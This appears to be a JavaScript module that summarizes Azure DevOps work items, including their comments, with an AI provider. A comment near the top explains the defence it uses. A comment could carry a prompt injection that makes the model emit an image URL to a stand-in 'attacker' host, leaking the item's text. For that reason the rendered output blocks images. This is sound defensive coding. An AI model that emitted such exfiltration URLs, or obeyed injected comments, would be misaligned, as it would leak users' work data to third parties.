(function(global) {
  'use strict';
  // Localized string helper
  const L = (k, fallback, p) => (typeof window !== 'undefined' && window.i18n) ? window.i18n.t(k, p) : fallback;

  const summaryCache = {};
  let modalEl = null;
  let backdropEl = null;
  let hoverPopover = null;

  // Model output is UNTRUSTED. Work-item comments are written by other people in the ADO
  // org and go into the prompt verbatim, so a comment can carry a prompt injection that
  // makes the model emit `![](https://attacker/?d=<leaked text>)`. The manifest CSP sets
  // no img-src, so the browser would fetch that URL and exfiltrate the item — a channel
  // that bypasses the strict connect-src entirely. A summary never needs images.
  function renderAiMarkdown(el, md) {
    const lib = window.AdoLib;
    if (lib && lib.mdToHtml) el.innerHTML = lib.mdToHtml(md, { allowImages: false });
    else el.textContent = md; // no renderer: show as text, never as HTML
  }

  function createModal() {
    if (modalEl) return;

    backdropEl = document.createElement('div');
    backdropEl.id = 'ai-summary-modal-backdrop';
    backdropEl.className = 'ai-modal-overlay';
    backdropEl.style.position = 'fixed';
    backdropEl.style.display = 'none';
    backdropEl.style.zIndex = '19999';

    modalEl = document.createElement('div');
    modalEl.id = 'ai-summary-modal';
    modalEl.className = 'ai-modal-card';
    modalEl.style.width = '550px';
    modalEl.style.maxWidth = '90vw';
    modalEl.style.zIndex = '20000';

    modalEl.innerHTML = `
      <div class="ai-modal-header" style="display: flex; justify-content: space-between; align-items: center; padding: 16px 20px; border-bottom: 1px solid var(--line, #333);">
        <h3 class="ai-modal-title" style="display: flex; align-items: center; gap: 8px; margin: 0; font-size: 1.2rem; font-weight: 600;">
          <span style="color:#a855f7; display:flex; align-items:center;"><ui-icon name="sparkles"></ui-icon></span>
          <span id="ai-summary-title">${L('ai.summarize.title', 'AI Summary')}</span>
        </h3>
        <button class="ai-modal-close" id="ai-summary-modal-close-btn" style="background:none; border:none; color:var(--muted, #888); font-size:1.5rem; cursor:pointer;">&times;</button>
      </div>
      <div class="ai-modal-body" style="padding: 20px; overflow-y: auto; max-height: 50vh; font-size: 0.9rem; line-height: 1.5; color: var(--txt);">
        <div id="ai-summary-modal-content"></div>
      </div>
      <div class="ai-modal-footer" style="display: flex; gap: 8px; justify-content: flex-end; padding: 16px 20px; border-top: 1px solid var(--line, #333);">
        <button class="btn btn-secondary" id="ai-summary-modal-regenerate-btn" style="display: flex; align-items: center; gap: 6px; padding: 6px 12px; font-size: 0.85rem; border-radius: 6px; cursor: pointer;">
          <span style="display:flex; align-items:center;"><ui-icon name="refresh-cw"></ui-icon></span> ${L('ai.summarize.regenerate', 'Regenerate')}
        </button>
        <button class="btn btn-primary" id="ai-summary-modal-ok-btn" style="padding: 6px 16px; font-size: 0.85rem; border-radius: 6px; cursor: pointer;">${L('common.close', 'Close')}</button>
      </div>
    `;

    backdropEl.appendChild(modalEl);
    document.body.appendChild(backdropEl);

    // Bind events
    modalEl.querySelector('#ai-summary-modal-close-btn').onclick = closeModal;
    modalEl.querySelector('#ai-summary-modal-ok-btn').onclick = closeModal;
    backdropEl.onclick = closeModal;
    modalEl.querySelector('#ai-summary-modal-regenerate-btn').onclick = () => {
      AISummarizer.summarizeCurrentItem(true);
    };
  }

  function closeModal() {
    if (modalEl) {
      backdropEl.style.display = 'none';
      if (window.LayerManager) {
        window.LayerManager.close(modalEl);
      }
    }
  }

  function createHoverPopover() {
    if (hoverPopover) return;
    hoverPopover = document.createElement('div');
    hoverPopover.id = 'ai-summary-hover-popover';
    hoverPopover.className = 'ai-summary-hover-popover';
    hoverPopover.style.display = 'none';
    document.body.appendChild(hoverPopover);
  }

  function showHoverSummary() {
    const App = window.App || {};
    const wid = App.state?.cur;
    if (wid == null || !summaryCache[wid]) return;

    createHoverPopover();

    renderAiMarkdown(hoverPopover, summaryCache[wid]);

    const summarizeBtn = document.getElementById('s_ai_summarize');
    if (summarizeBtn) {
      const rect = summarizeBtn.getBoundingClientRect();
      let left = rect.left - 330;
      let top = rect.top;
      if (left < 10) {
        left = rect.left;
        top = rect.bottom + 6;
      }
      hoverPopover.style.left = `${left}px`;
      hoverPopover.style.top = `${top}px`;
      hoverPopover.style.display = 'block';

      if (window.LayerManager) {
        window.LayerManager.open(hoverPopover, null, { isPopover: true });
      }
    }
  }

  function hideHoverSummary() {
    if (hoverPopover) {
      hoverPopover.style.display = 'none';
      if (window.LayerManager) {
        window.LayerManager.close(hoverPopover);
      }
    }
  }

  function initHoverListeners() {
    const summarizeBtn = document.getElementById('s_ai_summarize');
    if (!summarizeBtn) {
      setTimeout(initHoverListeners, 100);
      return;
    }
    summarizeBtn.addEventListener('mouseenter', showHoverSummary);
    summarizeBtn.addEventListener('mouseleave', hideHoverSummary);
  }

  class AISummarizer {
    constructor(registry) {
      this.registry = registry || global.aiProviderRegistry;
    }

    async summarize(description, options = {}) {
      const provider = await this.registry.getActive();
      if (!provider) {
        throw new Error("AI is not available. No active provider found.");
      }

      const systemPrompt = global.SUMMARIZE_SYSTEM_PROMPT || 'Summarize the following work item description in 2-3 concise sentences.';
      return provider.prompt(systemPrompt, description, options);
    }

    static async summarizeCurrentItem(force = false) {
      const App = window.App || {};
      const wid = App.state?.cur;
      if (wid == null || !App.state.orig) return;

      createModal();

      // Show cached summary if it exists and we're not forcing regeneration
      if (!force && summaryCache[wid]) {
        document.getElementById('ai-summary-title').textContent = L('ai.summary.titleFor', 'AI Summary for #{id}', { id: wid });
        const contentEl = document.getElementById('ai-summary-modal-content');
        renderAiMarkdown(contentEl, summaryCache[wid]);

        backdropEl.style.display = 'flex';
        if (window.LayerManager) {
          window.LayerManager.open(modalEl, backdropEl);
        }
        return;
      }

      const aiReg = window.aiProviderRegistry || global.aiProviderRegistry;
      const ai = aiReg ? await aiReg.getActive() : null;
      if (!ai) {
        if (window.customAlert) {
          window.customAlert(L('ai.summarize.noProvider', 'No active AI provider configured.'), 'AI Summarize');
        } else {
          alert('No active AI provider configured.');
        }
        return;
      }

      if (window.checkAiCloudConsent) {
        const consented = await window.checkAiCloudConsent(ai);
        if (!consented) return;
      }

      // Show loader in modal content
      document.getElementById('ai-summary-title').textContent = L('ai.summary.titleFor', 'AI Summary for #{id}', { id: wid });
      const contentEl = document.getElementById('ai-summary-modal-content');
      contentEl.innerHTML = `
        <div style="display:flex; align-items:center; justify-content:center; flex-direction:column; gap:12px; padding:40px 0; color:var(--muted);">
          <span class="spin" style="width:24px; height:24px; border-width:3px; border-color:var(--accent) transparent transparent transparent; border-style:solid; border-radius:50%;"></span>
          <span>${L('ai.summarize.loading', 'Generating summary with AI...')}</span>
        </div>
      `;

      backdropEl.style.display = 'flex';
      if (window.LayerManager) {
        window.LayerManager.open(modalEl, backdropEl);
      }

      const summarizeBtn = document.getElementById('s_ai_summarize');
      let origHtml = '';
      if (summarizeBtn) {
        origHtml = summarizeBtn.innerHTML;
        summarizeBtn.classList.add('loading');
        summarizeBtn.innerHTML = '<span class="spin" style="width:12px;height:12px;border-width:1.5px"></span>';
      }

      try {
        const title = document.getElementById('s_title')?.value || '';
        const type = App.state.openItem?.type || 'Work Item';
        const state = App.state.openItem?.state || 'Active';
        const cleanDesc = (window.AdoLib && window.AdoLib.htmlToText) ? window.AdoLib.htmlToText(App.state.orig.desc || '') : (App.state.orig.desc || '');
        const cleanAc = (window.AdoLib && window.AdoLib.htmlToText) ? window.AdoLib.htmlToText(App.state.orig.ac || '') : (App.state.orig.ac || '');

        let comments = [];
        try {
          if (window.api && window.api.comments) {
            comments = await window.api.comments(wid);
          }
        } catch (e) {
          console.warn('Failed to load comments from api, checking currentComments:', e);
          if (window.currentComments) {
            comments = window.currentComments;
          }
        }

        let commentsText = '';
        if (comments && comments.length) {
          commentsText = comments.map(c => {
            const author = c.by || 'Unknown';
            const rawText = c.text || '';
            const cleanText = (window.AdoLib && window.AdoLib.htmlToText) ? window.AdoLib.htmlToText(rawText) : rawText;
            return `[Comment by ${author}]: ${cleanText}`;
          }).join('\n');
        }

        const systemPrompt = `You are an expert project manager and lead software engineer.
Analyze the provided Azure DevOps work item details and write a clear, highly structured, professional, and actionable summary.

Format your response in Markdown using the following exact structure:
### Overview
Provide a 1-2 sentence high-level summary of what this work item is about.

### Key Objectives & Details
- Bullet points detailing the core requirements, expected outcomes, or bug symptoms/logs.

### Discussion & Progress
- Summarize the comments and discussions (if any) to highlight what has been resolved, debated, or investigated.

### Next Steps / Blockers
- Actionable next steps or highlighted blockers from the details.`;

        const userMessage = `Work Item Details:
ID: #${wid}
Title: ${title}
Type: ${type}
State: ${state}

Description:
${cleanDesc || '(No description provided)'}

${cleanAc ? `Acceptance Criteria:\n${cleanAc}\n` : ''}
${commentsText ? `Discussion History:\n${commentsText}\n` : ''}`;

        const res = await ai.prompt(systemPrompt, userMessage);
        
        summaryCache[wid] = res;

        renderAiMarkdown(contentEl, res);
      } catch (err) {
        console.error('AISummarizer failed:', err);
        contentEl.innerHTML = `
          <div style="color: #ef4444; padding: 20px 0; text-align: center; font-weight: 500;">
            ${L('ai.summarize.failed', 'Failed to generate summary: {error}', { error: err.message })}
          </div>
        `;
      } finally {
        if (summarizeBtn) {
          summarizeBtn.classList.remove('loading');
          summarizeBtn.innerHTML = origHtml || '<ui-icon name="sparkles"></ui-icon>';
        }
      }
    }
  }

  global.AISummarizer = AISummarizer;
  global.aiSummarizer = new AISummarizer();

  if (typeof document !== 'undefined') {
    if (document.readyState === 'loading') {
      document.addEventListener('DOMContentLoaded', initHoverListeners);
    } else {
      initHoverListeners();
    }
  }

})(typeof globalThis !== 'undefined' ? globalThis : window);
